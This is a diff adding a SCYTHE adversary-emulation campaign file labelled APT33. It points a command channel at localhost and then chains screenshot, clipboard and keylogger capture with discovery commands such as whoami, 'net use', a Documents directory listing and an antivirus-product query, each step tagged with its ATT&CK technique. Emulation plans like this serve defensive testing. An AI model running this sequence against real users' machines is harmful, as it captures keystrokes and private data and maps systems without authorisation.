@@ -1,0 +1,218 @@
+{
+    "threat": {
+        "category": "User-Defined",
+        "description": "APT33 is a suspected Iranian threat group that has carried out operations since at least 2013.",
+        "display_name": "APT33",
+        "name": "APT33",
+        "operating_system_name": "windows",
+        "script": {
+            "0": {
+                "conf": "--cp 127.0.0.1:443 --multipart 10240 --secure true",
+                "module": "https",
+                "type": "initialization"
+            },
+            "1": {
+                "module": "loader",
+                "module_to_load": "printscr",
+                "request": "--load printscr",
+                "type": "message",
+                "xrand": "b5982e99b137f55c7eb1c85e54d19258"
+            },
+            "2": {
+                "depends_on": "4346510a-3dad-4302-8572-2bcdc8bc2e2c",
+                "module": "printscr",
+                "request": "--window Desktop",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0009",
+                    "att&ck-technique:T1113"
+                ],
+                "type": "message",
+                "xrand": "903e66327db74dd62d26bf642f96fe01"
+            },
+            "3": {
+                "module": "loader",
+                "module_to_load": "run",
+                "request": "--load run",
+                "type": "message",
+                "xrand": "a3180534a3a787ec45b15c4b16ebe44b"
+            },
+            "4": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "whoami",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1033"
+                ],
+                "type": "message",
+                "xrand": "8122408fc5898877334e79e4183f1ea6"
+            },
+            "5": {
+                "module": "loader",
+                "module_to_load": "clipboard",
+                "request": "--load clipboard",
+                "type": "message",
+                "xrand": "59f7fe4d738bec25a5764baebfb9cc87"
+            },
+            "6": {
+                "depends_on": "833ad3b4-679c-4078-8153-cf4d6f979b8b",
+                "module": "clipboard",
+                "request": "",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0009",
+                    "att&ck-technique:T1115"
+                ],
+                "type": "message",
+                "xrand": "801ca447fc7f6ce9c1bf5e4387496194"
+            },
+            "7": {
+                "module": "loader",
+                "module_to_load": "keylogger",
+                "request": "--load keylogger",
+                "type": "message",
+                "xrand": "23d0c4f8dbd6fe018b4c5ddcf1d6ac0e"
+            },
+            "8": {
+                "depends_on": "8085957f-b422-48cb-960b-1f077790299d",
+                "module": "keylogger",
+                "request": "--start",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0009",
+                    "att&ck-technique:T1056"
+                ],
+                "type": "message",
+                "xrand": "620a292813a28ade2adeacae24237f18"
+            },
+            "9": {
+                "module": "loader",
+                "module_to_load": "sysinfo",
+                "request": "--load sysinfo",
+                "type": "message",
+                "xrand": "43ccefac3eba81239466e973cd9a646e"
+            },
+            "10": {
+                "depends_on": "14ba9c44-45b7-4630-b252-ad578faaeba9",
+                "module": "sysinfo",
+                "request": "",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1082"
+                ],
+                "type": "message",
+                "xrand": "e54a567631bb152663d09e0f72663fb4"
+            },
+            "11": {
+                "module": "loader",
+                "module_to_load": "processes",
+                "request": "--load processes",
+                "type": "message",
+                "xrand": "55d51d63885628e6eff0552231a6bd1f"
+            },
+            "12": {
+                "depends_on": "62dc619d-529a-441f-87e4-89778eee9587",
+                "module": "processes",
+                "request": "",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1057"
+                ],
+                "type": "message",
+                "xrand": "d08d0b56a716484bd44368efd33bfba5"
+            },
+            "13": {
+                "module": "loader",
+                "module_to_load": "services",
+                "request": "--load services",
+                "type": "message",
+                "xrand": "5977b06584c2992b65ef227dfb14c47d"
+            },
+            "14": {
+                "depends_on": "b819526e-8a99-45b1-8aa0-d6578545cf2f",
+                "module": "services",
+                "request": "--all",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1007"
+                ],
+                "type": "message",
+                "xrand": "403421e28dea1fabe02bfb0811537afc"
+            },
+            "15": {
+                "module": "loader",
+                "module_to_load": "arp",
+                "request": "--load arp",
+                "type": "message",
+                "xrand": "57725e2404768642b89b4d1b99450549"
+            },
+            "16": {
+                "depends_on": "be0bf7fa-c7ae-4ea7-a929-a22c51df209e",
+                "module": "arp",
+                "request": "",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1016"
+                ],
+                "type": "message",
+                "xrand": "b279f633e6580009de4c407feede7d6b"
+            },
+            "17": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c dir %USERPROFILE%\\Documents",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1083"
+                ],
+                "type": "message",
+                "xrand": "dbb1b0e6d143c565d78fb7f1f8d55f62"
+            },
+            "18": {
+                "module": "loader",
+                "module_to_load": "upsh",
+                "request": "--load upsh",
+                "type": "message",
+                "xrand": "58e3a52823ce6b1adc1e2c3b5c24d11f"
+            },
+            "19": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct",
+                "type": "message",
+                "xrand": "ba0661e37947c6dbd63f5d387226e36a"
+            },
+            "20": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd Get-DnsClientServerAddress",
+                "type": "message",
+                "xrand": "a2341a8182ec2f21cf0adc4605ee886b"
+            },
+            "21": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "net use",
+                "type": "message",
+                "xrand": "506dd08321701c2b79435240ff618a9e"
+            }
+        },
+        "signature": "3ce1cbeedb097e1a0c3b83ebdd6c955a7433cf29"
+    }
+}
